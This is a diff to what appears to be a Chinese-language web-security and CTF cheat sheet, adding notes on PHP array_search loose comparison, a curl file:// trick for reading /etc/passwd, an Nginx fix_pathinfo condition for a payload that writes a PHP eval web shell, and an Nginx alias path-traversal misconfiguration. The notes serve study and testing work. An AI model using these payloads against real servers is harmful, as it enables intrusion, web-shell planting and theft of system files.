@@ -278,6 +278,18 @@ A=fl;B=ag;cat $A$B
 - `in_array('kaibro', array(0, 1, 2))`
     - true
 
+## array_search
+
+- `mixed array_search(mixed $needle , array $haystack [, bool $strict = false ])`
+    - 在`haystack`陣列中，搜尋`needle`的值，成功則返回index，失敗返回False
+- `$strict`為false時，採用不嚴格比較
+    - 預設是False
+- Example
+    - `$arr=array(1,2,0); var_dump(array_search('kai', $arr))`
+        - `int(2)`
+    - `$arr=array(1,2,0); var_dump(array_search('1', $arr))`
+        - `int(0)`
+
 ## parse_str
 - `parse_str(string, array)`
 - 會把查詢字串解析到變數中
@@ -1422,6 +1434,9 @@ http://[::]
         - dump binary
     - `file:///proc/self/environ`
         - 讀環境變數
+    - `curl file://google.com/etc/passwd`
+        - 新版已修掉
+        - 實測libcurl 7.47可work
     - Java原生可列目錄
     - Perl/Ruby open Command Injection
 
@@ -1641,6 +1656,7 @@ xxe.dtd:
              - user.asp;aa.jpg
      - Nginx
          - nginx < 8.03
+             - `cgi.fix_pathinfo=1`
              - Fast-CGI開啟狀況下
              - kaibro.jpg: `<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>`
              - 訪問`kaibro.jpg/.php`生成shell.php
@@ -1697,6 +1713,17 @@ xxe.dtd:
     - MySQL utf8編碼只支援3 bytes
     - 若將4 bytes的utf8mb4插入utf8中，在non strict模式下會被截斷
     - CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability
+
+- Nginx目錄穿越漏洞
+    - 常見於Nginx做Reverse Proxy的狀況
+    ```
+    location /files {
+        alias /home/
+    }
+    ```
+    - 因為`/files`沒有加上結尾`/`，而`/home/`有
+    - 所以`/files../`可以訪問上層目錄
+
 
 - Apache Tomcat Session操縱漏洞
     - 預設session範例頁面`/examples/servlets /servlet/SessionExample`
